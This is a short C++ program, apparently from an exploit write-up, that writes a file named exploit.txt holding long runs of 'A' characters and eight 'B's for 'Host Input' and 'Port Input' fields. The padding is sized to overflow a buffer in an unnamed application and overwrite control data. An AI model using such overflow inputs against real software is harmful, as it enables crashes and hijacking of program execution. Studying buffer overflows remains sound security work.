#include <cstdio>
#include <iostream>
// wrote a little shit code to generate > nicely for u those strings
using namespace std;
int main(){
 
  char buff1[] = "\x41";
  char buff2[] = "\x42";
  FILE *txtfile;
  txtfile = fopen("c:\\exploit.txt", "w");
  fputs("Host Input:\n",txtfile);
  for(int i=0; i < 659; i++){
    fputs(buff1,txtfile);
    }
  fputs("\n",txtfile);
  fputs("Port Input:\n",txtfile);
  for (int y=0; y < 652; y++) {
    fputs(buff1,txtfile);
    }
  for(int x=0; x < 8; x++) {
    fputs(buff2,txtfile);
    }
  fclose(txtfile);
  return 0;
}
